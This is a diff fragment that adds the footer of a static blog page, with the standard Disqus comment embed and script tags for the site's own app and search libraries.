+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//amiaaaz.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+<hr>
+</footer>
+<script src=/dist/app.js></script>
+<script src=/lib/fuse.min.js></script>
+<script src=/lib/fastsearch.js></script>
+</div>
+</body>
+</html>
